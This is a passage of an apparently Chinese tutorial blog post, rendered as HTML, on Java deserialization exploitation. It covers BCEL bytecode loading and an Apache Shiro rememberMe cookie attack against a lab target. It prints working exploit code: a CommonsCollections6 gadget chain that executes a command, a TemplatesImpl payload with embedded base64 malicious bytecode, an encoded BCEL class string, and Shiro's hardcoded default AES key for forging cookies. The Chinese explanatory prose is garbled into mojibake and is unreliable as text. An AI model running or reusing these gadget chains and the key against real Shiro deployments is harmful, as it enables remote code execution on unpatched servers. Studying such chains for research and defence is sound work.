&#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åå°†BCELEvil.javaè½¬æ¢æˆBCELå­—èŠ‚ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> evil;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELencode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(evil.BCELEvil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130141306148.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130141306148.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>éªŒè¯æ˜¯å¦æˆåŠŸæ‰§è¡Œå­—èŠ‚ç ï¼šï¼ˆæ³¨æ„ClassLoader.loadClassæ˜¯è´Ÿè´£åŠ è½½ç±»çš„ï¼Œå­—ç¬¦ä¸²éœ€è¦ç”¨newInstance()å®ä¾‹åŒ–ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELdecode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span>+<span class="string">&quot;$l$8b$I$A$A$A$A$A$A$AeP$cbN$c30$Q$i$b7$a1IC$d2B$cb$fb$cd$89$c2$81$5c$b8$Vq$a0$w$X$c2C$U$95$b3k$acb$I$JJ$5d$c4$lq$ee$F$Q$H$3e$80$8fB$acC$81$o$oy$c7$3b$de$99$b1$f3$fe$f1$fa$G$60$H$eb$$lL$b9$98$c6$8c$83Y$83s6$e6m$y$d8Xd$u$ec$aaX$e9$3d$86$7cm$b3$cd$605$92K$c9P$OU$y$8f$fb$b7$j$99$9e$f3NDL$rL$E$8f$da$3cU$a6$l$92$96$beR$3d3$z$efU$U$ec7$9aa$936u$GgWDC_$bf$a5$b9$b89$e2w$99$86$92$Z$dcV$d2O$85$3cP$c6$c3$ff$96m_$f3$7b$ee$c1A$d1$c6$92$87e$ac$90$Pe$8am$f9$m$3d$acb$8d$a1jf$82$88$c7$dd$a0$f9$m$e4$9dVIL$W$7f$e2$Z$s$7e$a7N$3a$d7Rh$86$c9_$ea$ac$lkuK$c9nW$ea$9ff$ba$b6$Z$fe$9b$a1$97X$U$$$Y6j$p$a7$z$9d$aa$b8$5b$l$V$9c$a6$89$90$bd$5e$j$eb$u$d0$ef6_$O$cc$3c$86$aaK$5d$40$c8$I$c7$b6$9e$c1$G$d9$f18$d5BF$e6$e1Q$f5$be$G$e0$a3D$e8$a0$fc$p$3e$cc$cc$80$d2$Lr$95$fc$T$ac$8bGX$87$83$8c$x$92n$8c$i$8c$5b$89$d0x$W$e9$K$3e9xY$O0A$cbF$$$b41$J$SU2$ba$fa$JOO$ad$8b$o$C$A$A&quot;</span>).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130142334254.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130142334254.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="shiroååºåˆ—åŒ–"><a href="#shiroååºåˆ—åŒ–" class="headerlink" title="shiroååºåˆ—åŒ–"></a>shiroååºåˆ—åŒ–</h2><p>ç”±äºå‰é¢å‡ ç§CCéƒ½æœ‰ä¸€å®šçš„é™åˆ¶ï¼Œæ¯”å¦‚CC1ç”¨åˆ°execéœ€è¦ä¸ºRuntimeä¸‹çš„æ–¹æ³•ï¼Œè€Œä¸”ä¸åŒçš„åˆ©ç”¨æ–¹å¼å¯¹åº”äº†ä¸åŒçš„åˆ©ç”¨é“¾ã€‚ä½†æ˜¯TemplatesImplå¯ä»¥æ‰§è¡Œä»»æ„javaä»£ç </p><ul><li>åŸç†ï¼šshiroä¸ºäº†è®©æµè§ˆå™¨ä¿å­˜ç™»å½•çŠ¶æ€ï¼Œå°†ä¿æŒç™»å½•çš„ä¿¡æ¯åºåˆ—åŒ–å¹¶åŠ å¯†åä¿å­˜åœ¨Cookieçš„rememberMeå­—æ®µï¼Œåœ¨è¯»å–æ—¶ååºåˆ—åŒ–ã€‚ä½†åœ¨shiro 1.2.4ç‰ˆæœ¬å‰åŠ å¯†keyå›ºå®š</li></ul><p>é¶æœºï¼š<a href="https://github.com/phith0n/JavaThings/blob/master/shirodemo">https://github.com/phith0n/JavaThings/blob/master/shirodemo</a></p><p>å¯¹javaé¡¹ç›®è¿›è¡Œæ‰“åŒ…ï¼šå³ä¾§maven-&gt;ç”Ÿå‘½å‘¨æœŸ-&gt;clean-&gt;complie-&gt;package å°±å¯ä»¥çœ‹åˆ°æœ‰è¾“å‡ºåŒ…</p><p>é…ç½®åˆ°tomcatä¸Šï¼šä¸‹è½½tomcatåå®‰è£…ï¼ˆä¸ç”¨é…ç¯å¢ƒå˜é‡ï¼‰-&gt;IDEAé‡Œè¿è¡Œ-&gt;ç¼–è¾‘é…ç½®-&gt;åº”ç”¨ç¨‹åºæœåŠ¡å™¨æŒ‡å‘tomcatæ–‡ä»¶-&gt;éƒ¨ç½²é‡Œæ·»åŠ å·²æ‰“åŒ…çš„åŒ…-&gt;ç¡®å®šåè¿è¡Œ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204135854142.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204135854142.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ­£ç¡®çš„è´¦å·å¯†ç ä¸º root secret</p><p>åœ¨ç™»å½•æ—¶é€‰ä¸­<code>Remember me</code>æœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªset-cookieä½œä¸ºå®¢æˆ·ç«¯cookie</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204135939822.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204135939822.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ”»å‡»æ–¹å¼ï¼šç”¨ <strong>shiroåŠ å¯†cookieçš„key</strong> åŠ å¯†payloadï¼Œæ”¾åˆ°cookieä¸­è¿›è¡Œæ”»å‡»</p><p>è¯¥é¶æœºkeyçš„å€¼ä¸ºï¼š<code>kPH+bIxk5D2deZiIxcaaaA==</code>çš„base64è§£ç ï¼ˆé»˜è®¤å¯†é’¥ï¼‰ã€‚åŠ å¯†æ–¹å¼ä¸ºaes</p><p>æ¼æ´ç‰¹å¾ä¸ºï¼šç™»å½•é¡µé¢å“åº”åŒ…æœ‰rememberMe&#x3D;deleteMeã€‚Cookieä¸­æœ‰rememberMå­—æ®µ</p><p>æ£€æµ‹å·¥å…·ï¼š<code>https://github.com/feihong-cs/ShiroExploit</code></p><blockquote><p>shiroæ— æ³•åˆ©ç”¨CC1,6ã€‚å› ä¸ºshiroçš„ClassResolvingObjectInputStreamé‡å†™äº†resolveClass(æŸ¥æ‰¾ç±»çš„æ–¹æ³•)ï¼Œè€ŒresolveClassä½¿ç”¨åˆ°çš„forNameå’ŒåŸç”Ÿçš„Class.forNameä¸ä¸€æ ·ã€‚å¯¼è‡´ååºåˆ—åŒ–æµä¸èƒ½åŒ…å«éjavaè‡ªèº«çš„æ•°ç»„ï¼ŒCC1,6éƒ½ä½¿ç”¨äº†Transformeræ•°ç»„</p></blockquote><p>åœ¨ä¸Šä¸€ç¯‡çš„CC6(<code>https://xz.aliyun.com/t/11861</code>)ä¸­ï¼Œååºåˆ—åŒ–é“¾ä¸ºï¼š<code>java.util.HashMap#readObject()</code> åˆ°<code>HashMap#hash()</code>åˆ°<code>TiedMapEntry#hashCode()</code>åˆ°<code>TiedMapEntry#getValue()</code>åˆ°<code>LazyMap.get()</code>(getä¸åˆ°å€¼çš„æ—¶å€™è§¦å‘)åˆ°<code>transformer()</code>ã€‚transformerè°ƒç”¨ConstantTransformerå’ŒInvokerTransformerè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p>CC6çš„POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);<span class="comment">//å…ˆç»‘å®šå‡transform</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¾æ—§ç”¨äº†Transformer[]æ•°ç»„ï¼Œå› ä¸ºéœ€è¦ç”¨åˆ°chainedTransformerã€‚ä¸ºäº†èˆå¼ƒchainedTransformerå°±å¿…é¡»èˆå¼ƒConstantTransformer(åˆå§‹åŒ–æ¶æ„å¯¹è±¡)å’ŒInvokerTransformerçš„å…¶ä¸­ä¸€ä¸ªã€‚</p><p>ä¸ºäº†è§¦å‘TiedMapEntry#hashcode()ï¼Œåœ¨å®ä¾‹åŒ–TiedMapEntryæ—¶ä¼ å…¥äº†LazyMapå¯¹è±¡ã€‚åœ¨æ„é€ TiedMapEntryæ—¶ï¼Œç¬¬äºŒä¸ªå‚æ•°éƒ½æ˜¯éšä¾¿å¡«çš„ï¼ˆæ— è®ºvalueæ˜¯å¦ä¸ºâ€keykeyâ€éƒ½ä¼šä½¿<code>map.containsKey(key)==ture</code>ï¼Œåªè¦æœ‰å€¼)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>LazyMap#get()</code>æ—¶ä¼šæŠŠkeyä¼ åˆ°transformer[]-&gt;InvokerTransformer-&gt;transform()</p><p>æ‰€ä»¥åœ¨åˆ›å»ºtmeæ—¶ï¼ŒæŠŠkeyçš„å€¼æ”¹ä¸ºTemplatesImplæ¶æ„å¯¹è±¡å°±è¡Œäº†</p><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollectionsShiro</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getPayload(<span class="type">byte</span>[] clazzBytes) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code =Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOgoACQAhCQAiACMIACQKACUAJgoAJwAoCAApCgAnACoHACsHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExldmlsL0V2aWxUZW1wbGF0ZXNJbXBsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHAC4BAApTb3VyY2VGaWxlAQAWRXZpbFRlbXBsYXRlc0ltcGwuamF2YQwAHAAdBwAvDAAwADEBABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAyDAAzADQHADUMADYANwEACGNhbGMuZXhlDAA4ADkBABZldmlsL0V2aWxUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACAAJAAAAAAADAAEACgALAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAKAA4AAAAgAAMAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAEwAUAAIAFQAAAAQAAQAWAAEACgAXAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAMAA4AAAAqAAQAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAGAAZAAIAAAABABoAGwADABUAAAAEAAEAFgABABwAHQACAAwAAABMAAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAgANAAAAEgAEAAAADwAEABAADAARABUAEgAOAAAADAABAAAAFgAPABAAAAAVAAAABAABAB4AAQAfAAAAAgAg&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);<span class="comment">//é¿å…è°ƒè¯•ä¸­å¤šæ¬¡è°ƒç”¨LazyMapï¼Œéšä¾¿å…ˆæ”¾ä¸ªç±»</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, obj);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.clear();<span class="comment">//ä½œç”¨ç­‰åŒouterMap.remove()</span></span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);<span class="comment">//æ›¿æ¢ä¸ºååºåˆ—åŒ–é“¾å…¥å£</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨åˆ°Clientattackç±»æŠŠä¸Šé¢çš„payloadç”¨å¯†é’¥è¿›è¡ŒåŠ å¯†ã€‚</p><p>javassiståº“åŠ è½½TemplatesImplç¼–è¯‘çš„å­—èŠ‚ç ï¼Œç„¶åbase64è§£å¯†çš„å¯†é’¥è¿›è¡ŒaesåŠ å¯†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Clientattack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception 